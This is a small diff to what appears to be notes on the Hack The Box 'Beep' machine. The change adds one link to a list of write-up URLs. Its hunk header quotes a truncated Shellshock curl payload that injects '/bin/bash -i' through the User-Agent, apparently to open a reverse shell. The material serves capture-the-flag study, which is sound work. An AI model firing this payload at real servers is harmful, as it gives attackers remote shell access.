@@ -236,3 +236,4 @@ curl -A "() { :; }; echo Content-Type: text/plain ; echo ; echo ; /bin/bash -i >
 + https://mertle.medium.com/write-up-htb-beep-9b4159ca3005
 + https://medium.com/@siddharth.singhal1995/hackthebox-walkthrough-beep-5-60e29ad0668a
 + https://www.siberportal.org/red-team/penetration-testing/hack-the-box-beep-cozumu/
++ https://medium.com/@orhan_yildirim/beep-hackthebox-write-up-bf75e29dccea
